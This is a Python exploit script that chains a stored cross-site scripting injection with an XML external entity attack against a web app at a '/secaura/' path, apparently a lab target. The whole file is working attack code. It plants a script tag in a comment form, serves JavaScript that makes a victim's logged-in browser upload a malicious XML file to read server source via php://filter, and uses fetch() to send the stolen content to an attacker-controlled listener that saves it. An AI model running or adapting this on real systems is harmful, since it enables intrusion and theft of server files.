#!/usr/bin/env python3

import http.server
import socketserver
import threading
from urllib.parse import urlparse, parse_qs, urljoin
import requests
import argparse

# ---------- JavaScript payload ----------
# Note the doubled {{ }} where JavaScript needs literal braces.
XXE_JS_PAYLOAD = """var xhr = new XMLHttpRequest();
xhr.open("POST", "http://localhost/secaura/upload.php", true); // adjust path if needed
xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryIWVuNqKqQF7AtNDv");
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function() {{
    if(this.readyState === 4) {{
        console.log(this.responseText);
        var response = this.responseText;
        fetch("http://{listener_ip}:{listener_port}/content?url=" + 
              encodeURIComponent("xxe") + 
              "&content=" + encodeURIComponent(response), {{
            method: "GET",
            mode: "no-cors"
        }}).catch(function(error) {{
            console.log("Fetch error (expected with no-cors):", error);
        }});
    }}
}});

var body = "------WebKitFormBoundaryIWVuNqKqQF7AtNDv\\r\\n" + 
  "Content-Disposition: form-data; name=\\"comments\\"; filename=\\"test.xml\\"\\r\\n" + 
  "Content-Type: text/xml\\r\\n" + 
  "\\r\\n" + 
  "<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\r\\n" + 
  "<!DOCTYPE xxeFileRead [<!ENTITY file SYSTEM \\"php://filter/convert.base64-encode/resource=upload.php\\">]>\\r\\n" + 
  "<comments>\\r\\n" + 
  "    <name>Soliman</name>\\r\\n" + 
  "    <comment>&file;</comment>\\r\\n" + 
  "</comments>\\r\\n" + 
  "------WebKitFormBoundaryIWVuNqKqQF7AtNDv\\r\\n" + 
  "Content-Disposition: form-data; name=\\"submit\\"\\r\\n" + 
  "\\r\\n" + 
  "Upload Image\\r\\n" + 
  "------WebKitFormBoundaryIWVuNqKqQF7AtNDv--\\r\\n";

var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 

xhr.send(new Blob([aBody]));"""

# ---------- Deliver XSS ----------
def deliverXss(target, listener_ip, listener_port):
    """Send the XSS payload to the target host."""
    url = urljoin(target, "/secaura/")
    xss_payload = f'"><script src=http://{listener_ip}:{listener_port}/xxe.js></script>'
    data = {"comment": xss_payload, "name": "Hacker"}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        r = requests.post(url, data=data, headers=headers, allow_redirects=False)
        if "Added comment :)" in r.text:
            print(f"[deliverXss] POST sent to {url}. Status: {r.status_code}")
        else:
            print("[-] Failed to deliver the XSS payload")
    except Exception as e:
        print(f"[deliverXss] Error sending request: {e}")

# ---------- HTTP handler ----------
class CORSHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        if self.path.startswith('/content'):
            parsed_url = urlparse(self.path)
            params = parse_qs(parsed_url.query)
            print("[XXE] Received data:")
            for key, value in params.items():
                print(f"  {key}: {value[0][:100]}...")
                if key == 'content' and value:
                    try:
                        with open('upload.php.txt', 'w', encoding='utf-8') as f:
                            f.write(value[0])
                        print("  [+] Content saved to upload.php.txt")
                        print("  [!] Content received - shutting down server...")
                        threading.Thread(target=self.server.shutdown).start()
                    except Exception as e:
                        print(f"  [-] Error saving file: {e}")

            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Data received successfully')

        elif self.path == '/xxe.js':
            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            # safely insert listener IP/port into the JS payload
            self.wfile.write(
                XXE_JS_PAYLOAD.format(
                    listener_ip=args.listener_ip,
                    listener_port=args.listener_port
                ).encode('utf-8')
            )
            print("[+] Served xxe.js payload")
        else:
            super().do_GET()

# ---------- Main function ----------
def main():
    parser = argparse.ArgumentParser(description="XXE Exfiltration Server with XSS delivery")
    parser.add_argument("target", help="Target's base URL (e.g., http://192.168.1.7)")
    parser.add_argument("listener_ip", help="Your listener IP for callbacks")
    parser.add_argument("listener_port", type=int, help="Port for HTTP server (e.g., 1337)")
    global args
    args = parser.parse_args()

    print(f"[*] Starting XXE exfiltration server on port {args.listener_port}")
    print(f"[*] JavaScript payload available at: http://{args.listener_ip}:{args.listener_port}/xxe.js")

    # 1. Deliver the XSS payload
    deliverXss(args.target, args.listener_ip, args.listener_port)

    # 2. Start the HTTP server to wait for exfiltrated content
    with socketserver.TCPServer(("", args.listener_port), CORSHTTPRequestHandler) as httpd:
        try:
            print("Waiting for exfiltrated data...")
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Server stopped by user")
            httpd.shutdown()

# ---------- Script entry point ----------
if __name__ == "__main__":
    main()
